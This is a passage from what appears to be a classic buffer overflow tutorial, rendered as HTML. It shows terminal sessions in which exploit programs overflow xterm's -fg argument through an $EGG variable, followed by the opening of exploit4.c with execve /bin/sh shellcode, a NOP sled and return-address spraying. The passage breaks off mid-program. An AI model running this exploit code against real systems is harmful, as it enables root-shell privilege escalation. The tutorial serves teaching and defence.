<a id=__codelineno-0-1189 name=__codelineno-0-1189 href=#__codelineno-0-1189></a>
<a id=__codelineno-0-1190 name=__codelineno-0-1190 href=#__codelineno-0-1190></a>
<a id=__codelineno-0-1191 name=__codelineno-0-1191 href=#__codelineno-0-1191></a>
<a id=__codelineno-0-1192 name=__codelineno-0-1192 href=#__codelineno-0-1192></a>
<a id=__codelineno-0-1193 name=__codelineno-0-1193 href=#__codelineno-0-1193></a>
<a id=__codelineno-0-1194 name=__codelineno-0-1194 href=#__codelineno-0-1194></a>
<a id=__codelineno-0-1195 name=__codelineno-0-1195 href=#__codelineno-0-1195></a>
<a id=__codelineno-0-1196 name=__codelineno-0-1196 href=#__codelineno-0-1196></a>
<a id=__codelineno-0-1197 name=__codelineno-0-1197 href=#__codelineno-0-1197></a>¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤
<a id=__codelineno-0-1198 name=__codelineno-0-1198 href=#__codelineno-0-1198></a>^C
<a id=__codelineno-0-1199 name=__codelineno-0-1199 href=#__codelineno-0-1199></a>[aleph1]$ exit
<a id=__codelineno-0-1200 name=__codelineno-0-1200 href=#__codelineno-0-1200></a>[aleph1]$ ./exploit3 2148 100
<a id=__codelineno-0-1201 name=__codelineno-0-1201 href=#__codelineno-0-1201></a>Using address: 0xbffffd48
<a id=__codelineno-0-1202 name=__codelineno-0-1202 href=#__codelineno-0-1202></a>[aleph1]$ /usr/X11R6/bin/xterm -fg $EGG
<a id=__codelineno-0-1203 name=__codelineno-0-1203 href=#__codelineno-0-1203></a>Warning: Color name &quot;ë^1¤FF
<a id=__codelineno-0-1204 name=__codelineno-0-1204 href=#__codelineno-0-1204></a>                           °
<a id=__codelineno-0-1205 name=__codelineno-0-1205 href=#__codelineno-0-1205></a>                            óV
<a id=__codelineno-0-1206 name=__codelineno-0-1206 href=#__codelineno-0-1206></a>
<a id=__codelineno-0-1207 name=__codelineno-0-1207 href=#__codelineno-0-1207></a>¤1¤Ø@¤èÜÿÿÿ/bin/sh¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤
<a id=__codelineno-0-1208 name=__codelineno-0-1208 href=#__codelineno-0-1208></a>
<a id=__codelineno-0-1209 name=__codelineno-0-1209 href=#__codelineno-0-1209></a>
<a id=__codelineno-0-1210 name=__codelineno-0-1210 href=#__codelineno-0-1210></a>
<a id=__codelineno-0-1211 name=__codelineno-0-1211 href=#__codelineno-0-1211></a>
<a id=__codelineno-0-1212 name=__codelineno-0-1212 href=#__codelineno-0-1212></a>
<a id=__codelineno-0-1213 name=__codelineno-0-1213 href=#__codelineno-0-1213></a>
<a id=__codelineno-0-1214 name=__codelineno-0-1214 href=#__codelineno-0-1214></a>
<a id=__codelineno-0-1215 name=__codelineno-0-1215 href=#__codelineno-0-1215></a>
<a id=__codelineno-0-1216 name=__codelineno-0-1216 href=#__codelineno-0-1216></a>ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H
<a id=__codelineno-0-1217 name=__codelineno-0-1217 href=#__codelineno-0-1217></a>
<a id=__codelineno-0-1218 name=__codelineno-0-1218 href=#__codelineno-0-1218></a>
<a id=__codelineno-0-1219 name=__codelineno-0-1219 href=#__codelineno-0-1219></a>
<a id=__codelineno-0-1220 name=__codelineno-0-1220 href=#__codelineno-0-1220></a>
<a id=__codelineno-0-1221 name=__codelineno-0-1221 href=#__codelineno-0-1221></a>
<a id=__codelineno-0-1222 name=__codelineno-0-1222 href=#__codelineno-0-1222></a>
<a id=__codelineno-0-1223 name=__codelineno-0-1223 href=#__codelineno-0-1223></a>
<a id=__codelineno-0-1224 name=__codelineno-0-1224 href=#__codelineno-0-1224></a>
<a id=__codelineno-0-1225 name=__codelineno-0-1225 href=#__codelineno-0-1225></a>¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿
<a id=__codelineno-0-1226 name=__codelineno-0-1226 href=#__codelineno-0-1226></a>
<a id=__codelineno-0-1227 name=__codelineno-0-1227 href=#__codelineno-0-1227></a>
<a id=__codelineno-0-1228 name=__codelineno-0-1228 href=#__codelineno-0-1228></a>
<a id=__codelineno-0-1229 name=__codelineno-0-1229 href=#__codelineno-0-1229></a>
<a id=__codelineno-0-1230 name=__codelineno-0-1230 href=#__codelineno-0-1230></a>
<a id=__codelineno-0-1231 name=__codelineno-0-1231 href=#__codelineno-0-1231></a>
<a id=__codelineno-0-1232 name=__codelineno-0-1232 href=#__codelineno-0-1232></a>
<a id=__codelineno-0-1233 name=__codelineno-0-1233 href=#__codelineno-0-1233></a>
<a id=__codelineno-0-1234 name=__codelineno-0-1234 href=#__codelineno-0-1234></a>H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ
<a id=__codelineno-0-1235 name=__codelineno-0-1235 href=#__codelineno-0-1235></a>
<a id=__codelineno-0-1236 name=__codelineno-0-1236 href=#__codelineno-0-1236></a>
<a id=__codelineno-0-1237 name=__codelineno-0-1237 href=#__codelineno-0-1237></a>
<a id=__codelineno-0-1238 name=__codelineno-0-1238 href=#__codelineno-0-1238></a>
<a id=__codelineno-0-1239 name=__codelineno-0-1239 href=#__codelineno-0-1239></a>
<a id=__codelineno-0-1240 name=__codelineno-0-1240 href=#__codelineno-0-1240></a>
<a id=__codelineno-0-1241 name=__codelineno-0-1241 href=#__codelineno-0-1241></a>
<a id=__codelineno-0-1242 name=__codelineno-0-1242 href=#__codelineno-0-1242></a>
<a id=__codelineno-0-1243 name=__codelineno-0-1243 href=#__codelineno-0-1243></a>¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ
<a id=__codelineno-0-1244 name=__codelineno-0-1244 href=#__codelineno-0-1244></a>Warning: some arguments in previous message were lost
<a id=__codelineno-0-1245 name=__codelineno-0-1245 href=#__codelineno-0-1245></a>Illegal instruction
<a id=__codelineno-0-1246 name=__codelineno-0-1246 href=#__codelineno-0-1246></a>[aleph1]$ exit
<a id=__codelineno-0-1247 name=__codelineno-0-1247 href=#__codelineno-0-1247></a>.
<a id=__codelineno-0-1248 name=__codelineno-0-1248 href=#__codelineno-0-1248></a>.
<a id=__codelineno-0-1249 name=__codelineno-0-1249 href=#__codelineno-0-1249></a>.
<a id=__codelineno-0-1250 name=__codelineno-0-1250 href=#__codelineno-0-1250></a>[aleph1]$ ./exploit4 2148 600
<a id=__codelineno-0-1251 name=__codelineno-0-1251 href=#__codelineno-0-1251></a>Using address: 0xbffffb54
<a id=__codelineno-0-1252 name=__codelineno-0-1252 href=#__codelineno-0-1252></a>[aleph1]$ /usr/X11R6/bin/xterm -fg $EGG
<a id=__codelineno-0-1253 name=__codelineno-0-1253 href=#__codelineno-0-1253></a>Warning: Color name &quot;ë^1¤FF
<a id=__codelineno-0-1254 name=__codelineno-0-1254 href=#__codelineno-0-1254></a>                           °
<a id=__codelineno-0-1255 name=__codelineno-0-1255 href=#__codelineno-0-1255></a>                            óV
<a id=__codelineno-0-1256 name=__codelineno-0-1256 href=#__codelineno-0-1256></a>
<a id=__codelineno-0-1257 name=__codelineno-0-1257 href=#__codelineno-0-1257></a>¤1¤Ø@¤èÜÿÿÿ/bin/shûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tû
<a id=__codelineno-0-1258 name=__codelineno-0-1258 href=#__codelineno-0-1258></a>
<a id=__codelineno-0-1259 name=__codelineno-0-1259 href=#__codelineno-0-1259></a>
<a id=__codelineno-0-1260 name=__codelineno-0-1260 href=#__codelineno-0-1260></a>
<a id=__codelineno-0-1261 name=__codelineno-0-1261 href=#__codelineno-0-1261></a>
<a id=__codelineno-0-1262 name=__codelineno-0-1262 href=#__codelineno-0-1262></a>
<a id=__codelineno-0-1263 name=__codelineno-0-1263 href=#__codelineno-0-1263></a>
<a id=__codelineno-0-1264 name=__codelineno-0-1264 href=#__codelineno-0-1264></a>
<a id=__codelineno-0-1265 name=__codelineno-0-1265 href=#__codelineno-0-1265></a>
<a id=__codelineno-0-1266 name=__codelineno-0-1266 href=#__codelineno-0-1266></a>ÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿T
<a id=__codelineno-0-1267 name=__codelineno-0-1267 href=#__codelineno-0-1267></a>
<a id=__codelineno-0-1268 name=__codelineno-0-1268 href=#__codelineno-0-1268></a>
<a id=__codelineno-0-1269 name=__codelineno-0-1269 href=#__codelineno-0-1269></a>
<a id=__codelineno-0-1270 name=__codelineno-0-1270 href=#__codelineno-0-1270></a>
<a id=__codelineno-0-1271 name=__codelineno-0-1271 href=#__codelineno-0-1271></a>
<a id=__codelineno-0-1272 name=__codelineno-0-1272 href=#__codelineno-0-1272></a>
<a id=__codelineno-0-1273 name=__codelineno-0-1273 href=#__codelineno-0-1273></a>
<a id=__codelineno-0-1274 name=__codelineno-0-1274 href=#__codelineno-0-1274></a>
<a id=__codelineno-0-1275 name=__codelineno-0-1275 href=#__codelineno-0-1275></a>ûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿
<a id=__codelineno-0-1276 name=__codelineno-0-1276 href=#__codelineno-0-1276></a>
<a id=__codelineno-0-1277 name=__codelineno-0-1277 href=#__codelineno-0-1277></a>
<a id=__codelineno-0-1278 name=__codelineno-0-1278 href=#__codelineno-0-1278></a>
<a id=__codelineno-0-1279 name=__codelineno-0-1279 href=#__codelineno-0-1279></a>
<a id=__codelineno-0-1280 name=__codelineno-0-1280 href=#__codelineno-0-1280></a>
<a id=__codelineno-0-1281 name=__codelineno-0-1281 href=#__codelineno-0-1281></a>
<a id=__codelineno-0-1282 name=__codelineno-0-1282 href=#__codelineno-0-1282></a>
<a id=__codelineno-0-1283 name=__codelineno-0-1283 href=#__codelineno-0-1283></a>
<a id=__codelineno-0-1284 name=__codelineno-0-1284 href=#__codelineno-0-1284></a>Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ
<a id=__codelineno-0-1285 name=__codelineno-0-1285 href=#__codelineno-0-1285></a>
<a id=__codelineno-0-1286 name=__codelineno-0-1286 href=#__codelineno-0-1286></a>
<a id=__codelineno-0-1287 name=__codelineno-0-1287 href=#__codelineno-0-1287></a>
<a id=__codelineno-0-1288 name=__codelineno-0-1288 href=#__codelineno-0-1288></a>
<a id=__codelineno-0-1289 name=__codelineno-0-1289 href=#__codelineno-0-1289></a>
<a id=__codelineno-0-1290 name=__codelineno-0-1290 href=#__codelineno-0-1290></a>
<a id=__codelineno-0-1291 name=__codelineno-0-1291 href=#__codelineno-0-1291></a>
<a id=__codelineno-0-1292 name=__codelineno-0-1292 href=#__codelineno-0-1292></a>
<a id=__codelineno-0-1293 name=__codelineno-0-1293 href=#__codelineno-0-1293></a>¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ
<a id=__codelineno-0-1294 name=__codelineno-0-1294 href=#__codelineno-0-1294></a>Warning: some arguments in previous message were lost
<a id=__codelineno-0-1295 name=__codelineno-0-1295 href=#__codelineno-0-1295></a>bash$
<a id=__codelineno-0-1296 name=__codelineno-0-1296 href=#__codelineno-0-1296></a>------------------------------------------------------------------------------
<a id=__codelineno-0-1297 name=__codelineno-0-1297 href=#__codelineno-0-1297></a>
<a id=__codelineno-0-1298 name=__codelineno-0-1298 href=#__codelineno-0-1298></a>   Eureka! Less than a dozen tries and we found the magic numbers. If xterm
<a id=__codelineno-0-1299 name=__codelineno-0-1299 href=#__codelineno-0-1299></a>where installed suid root this would now be a root shell.
<a id=__codelineno-0-1300 name=__codelineno-0-1300 href=#__codelineno-0-1300></a>
<a id=__codelineno-0-1301 name=__codelineno-0-1301 href=#__codelineno-0-1301></a>
<a id=__codelineno-0-1302 name=__codelineno-0-1302 href=#__codelineno-0-1302></a>                            Small Buffer Overflows
<a id=__codelineno-0-1303 name=__codelineno-0-1303 href=#__codelineno-0-1303></a>                            ~~~~~~~~~~~~~~~~~~~~~~
<a id=__codelineno-0-1304 name=__codelineno-0-1304 href=#__codelineno-0-1304></a>
<a id=__codelineno-0-1305 name=__codelineno-0-1305 href=#__codelineno-0-1305></a>   There will be times when the buffer you are trying to overflow is so
<a id=__codelineno-0-1306 name=__codelineno-0-1306 href=#__codelineno-0-1306></a>small that either the shellcode wont fit into it, and it will overwrite the
<a id=__codelineno-0-1307 name=__codelineno-0-1307 href=#__codelineno-0-1307></a>return address with instructions instead of the address of our code, or the
<a id=__codelineno-0-1308 name=__codelineno-0-1308 href=#__codelineno-0-1308></a>number of NOPs you can pad the front of the string with is so small that the
<a id=__codelineno-0-1309 name=__codelineno-0-1309 href=#__codelineno-0-1309></a>chances of guessing their address is minuscule.  To obtain a shell from these
<a id=__codelineno-0-1310 name=__codelineno-0-1310 href=#__codelineno-0-1310></a>programs we will have to go about it another way.  This particular approach
<a id=__codelineno-0-1311 name=__codelineno-0-1311 href=#__codelineno-0-1311></a>only works when you have access to the program&#39;s environment variables.
<a id=__codelineno-0-1312 name=__codelineno-0-1312 href=#__codelineno-0-1312></a>
<a id=__codelineno-0-1313 name=__codelineno-0-1313 href=#__codelineno-0-1313></a>   What we will do is place our shellcode in an environment variable, and
<a id=__codelineno-0-1314 name=__codelineno-0-1314 href=#__codelineno-0-1314></a>then overflow the buffer with the address of this variable in memory.  This
<a id=__codelineno-0-1315 name=__codelineno-0-1315 href=#__codelineno-0-1315></a>method also increases your changes of the exploit working as you can make
<a id=__codelineno-0-1316 name=__codelineno-0-1316 href=#__codelineno-0-1316></a>the environment variable holding the shell code as large as you want.
<a id=__codelineno-0-1317 name=__codelineno-0-1317 href=#__codelineno-0-1317></a>
<a id=__codelineno-0-1318 name=__codelineno-0-1318 href=#__codelineno-0-1318></a>   The environment variables are stored in the top of the stack when the
<a id=__codelineno-0-1319 name=__codelineno-0-1319 href=#__codelineno-0-1319></a>program is started, any modification by setenv() are then allocated
<a id=__codelineno-0-1320 name=__codelineno-0-1320 href=#__codelineno-0-1320></a>elsewhere.  The stack at the beginning then looks like this:
<a id=__codelineno-0-1321 name=__codelineno-0-1321 href=#__codelineno-0-1321></a>
<a id=__codelineno-0-1322 name=__codelineno-0-1322 href=#__codelineno-0-1322></a>
<a id=__codelineno-0-1323 name=__codelineno-0-1323 href=#__codelineno-0-1323></a>      &lt;strings&gt;&lt;argv pointers&gt;NULL&lt;envp pointers&gt;NULL&lt;argc&gt;&lt;argv&gt;&lt;envp&gt;
<a id=__codelineno-0-1324 name=__codelineno-0-1324 href=#__codelineno-0-1324></a>
<a id=__codelineno-0-1325 name=__codelineno-0-1325 href=#__codelineno-0-1325></a>   Our new program will take an extra variable, the size of the variable
<a id=__codelineno-0-1326 name=__codelineno-0-1326 href=#__codelineno-0-1326></a>containing the shellcode and NOPs. Our new exploit now looks like this:
<a id=__codelineno-0-1327 name=__codelineno-0-1327 href=#__codelineno-0-1327></a>
<a id=__codelineno-0-1328 name=__codelineno-0-1328 href=#__codelineno-0-1328></a>exploit4.c
<a id=__codelineno-0-1329 name=__codelineno-0-1329 href=#__codelineno-0-1329></a>------------------------------------------------------------------------------
<a id=__codelineno-0-1330 name=__codelineno-0-1330 href=#__codelineno-0-1330></a>#include &lt;stdlib.h&gt;
<a id=__codelineno-0-1331 name=__codelineno-0-1331 href=#__codelineno-0-1331></a>
<a id=__codelineno-0-1332 name=__codelineno-0-1332 href=#__codelineno-0-1332></a>#define DEFAULT_OFFSET                    0
<a id=__codelineno-0-1333 name=__codelineno-0-1333 href=#__codelineno-0-1333></a>#define DEFAULT_BUFFER_SIZE             512
<a id=__codelineno-0-1334 name=__codelineno-0-1334 href=#__codelineno-0-1334></a>#define DEFAULT_EGG_SIZE               2048
<a id=__codelineno-0-1335 name=__codelineno-0-1335 href=#__codelineno-0-1335></a>#define NOP                            0x90
<a id=__codelineno-0-1336 name=__codelineno-0-1336 href=#__codelineno-0-1336></a>
<a id=__codelineno-0-1337 name=__codelineno-0-1337 href=#__codelineno-0-1337></a>char shellcode[] =
<a id=__codelineno-0-1338 name=__codelineno-0-1338 href=#__codelineno-0-1338></a>  &quot;\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b&quot;
<a id=__codelineno-0-1339 name=__codelineno-0-1339 href=#__codelineno-0-1339></a>  &quot;\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd&quot;
<a id=__codelineno-0-1340 name=__codelineno-0-1340 href=#__codelineno-0-1340></a>  &quot;\x80\xe8\xdc\xff\xff\xff/bin/sh&quot;;
<a id=__codelineno-0-1341 name=__codelineno-0-1341 href=#__codelineno-0-1341></a>
<a id=__codelineno-0-1342 name=__codelineno-0-1342 href=#__codelineno-0-1342></a>unsigned long get_esp(void) {
<a id=__codelineno-0-1343 name=__codelineno-0-1343 href=#__codelineno-0-1343></a>   __asm__(&quot;movl %esp,%eax&quot;);
<a id=__codelineno-0-1344 name=__codelineno-0-1344 href=#__codelineno-0-1344></a>}
<a id=__codelineno-0-1345 name=__codelineno-0-1345 href=#__codelineno-0-1345></a>
<a id=__codelineno-0-1346 name=__codelineno-0-1346 href=#__codelineno-0-1346></a>void main(int argc, char *argv[]) {
<a id=__codelineno-0-1347 name=__codelineno-0-1347 href=#__codelineno-0-1347></a>  char *buff, *ptr, *egg;
<a id=__codelineno-0-1348 name=__codelineno-0-1348 href=#__codelineno-0-1348></a>  long *addr_ptr, addr;
<a id=__codelineno-0-1349 name=__codelineno-0-1349 href=#__codelineno-0-1349></a>  int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;
<a id=__codelineno-0-1350 name=__codelineno-0-1350 href=#__codelineno-0-1350></a>  int i, eggsize=DEFAULT_EGG_SIZE;
<a id=__codelineno-0-1351 name=__codelineno-0-1351 href=#__codelineno-0-1351></a>
<a id=__codelineno-0-1352 name=__codelineno-0-1352 href=#__codelineno-0-1352></a>  if (argc &gt; 1) bsize   = atoi(argv[1]);
<a id=__codelineno-0-1353 name=__codelineno-0-1353 href=#__codelineno-0-1353></a>  if (argc &gt; 2) offset  = atoi(argv[2]);
<a id=__codelineno-0-1354 name=__codelineno-0-1354 href=#__codelineno-0-1354></a>  if (argc &gt; 3) eggsize = atoi(argv[3]);
<a id=__codelineno-0-1355 name=__codelineno-0-1355 href=#__codelineno-0-1355></a>
<a id=__codelineno-0-1356 name=__codelineno-0-1356 href=#__codelineno-0-1356></a>
<a id=__codelineno-0-1357 name=__codelineno-0-1357 href=#__codelineno-0-1357></a>  if (!(buff = malloc(bsize))) {
<a id=__codelineno-0-1358 name=__codelineno-0-1358 href=#__codelineno-0-1358></a>    printf(&quot;Can&#39;t allocate memory.\n&quot;);
<a id=__codelineno-0-1359 name=__codelineno-0-1359 href=#__codelineno-0-1359></a>    exit(0);
<a id=__codelineno-0-1360 name=__codelineno-0-1360 href=#__codelineno-0-1360></a>  }
<a id=__codelineno-0-1361 name=__codelineno-0-1361 href=#__codelineno-0-1361></a>  if (!(egg = malloc(eggsize))) {
<a id=__codelineno-0-1362 name=__codelineno-0-1362 href=#__codelineno-0-1362></a>    printf(&quot;Can&#39;t allocate memory.\n&quot;);
<a id=__codelineno-0-1363 name=__codelineno-0-1363 href=#__codelineno-0-1363></a>    exit(0);
<a id=__codelineno-0-1364 name=__codelineno-0-1364 href=#__codelineno-0-1364></a>  }
<a id=__codelineno-0-1365 name=__codelineno-0-1365 href=#__codelineno-0-1365></a>
<a id=__codelineno-0-1366 name=__codelineno-0-1366 href=#__codelineno-0-1366></a>  addr = get_esp() - offset;
<a id=__codelineno-0-1367 name=__codelineno-0-1367 href=#__codelineno-0-1367></a>  printf(&quot;Using address: 0x%x\n&quot;, addr);
<a id=__codelineno-0-1368 name=__codelineno-0-1368 href=#__codelineno-0-1368></a>
<a id=__codelineno-0-1369 name=__codelineno-0-1369 href=#__codelineno-0-1369></a>  ptr = buff;
<a id=__codelineno-0-1370 name=__codelineno-0-1370 href=#__codelineno-0-1370></a>  addr_ptr = (long *) ptr;
<a id=__codelineno-0-1371 name=__codelineno-0-1371 href=#__codelineno-0-1371></a>  for (i = 0; i &lt; bsize; i+=4)
<a id=__codelineno-0-1372 name=__codelineno-0-1372 href=#__codelineno-0-1372></a>    *(addr_ptr++) = addr;
<a id=__codelineno-0-1373 name=__codelineno-0-1373 href=#__codelineno-0-1373></a>
<a id=__codelineno-0-1374 name=__codelineno-0-1374 href=#__codelineno-0-1374></a>  ptr = egg;
<a id=__codelineno-0-1375 name=__codelineno-0-1375 href=#__codelineno-0-1375></a>  for (i = 0; i &lt; eggsize - strlen(shellcode) - 1; i++)
<a id=__codelineno-0-1376 name=__codelineno-0-1376 href=#__codelineno-0-1376></a>    *(ptr++) = NOP;
<a id=__codelineno-0-1377 name=__codelineno-0-1377 href=#__codelineno-0-1377></a>
<a id=__codelineno-0-1378 name=__codelineno-0-1378 href=#__codelineno-0-1378></a>  for (i = 0; i &lt; strlen(shellcode); i++)
<a id=__codelineno-0-1379 name=__codelineno-0-1379 href=#__codelineno-0-1379></a>    *(ptr++) = shellcode[i];
<a id=__codelineno-0-1380 name=__codelineno-0-1380 href=#__codelineno-0-1380></a>
<a id=__codelineno-0-1381 name=__codelineno-0-1381 href=#__codelineno-0-1381></a>  buff[bsize - 1] = &#39;\0&#39;;
<a id=__codelineno-0-1382 name=__codelineno-0-1382 href=#__codelineno-0-1382></a>  egg[eggsize - 1] = &#39;\0&#39;;
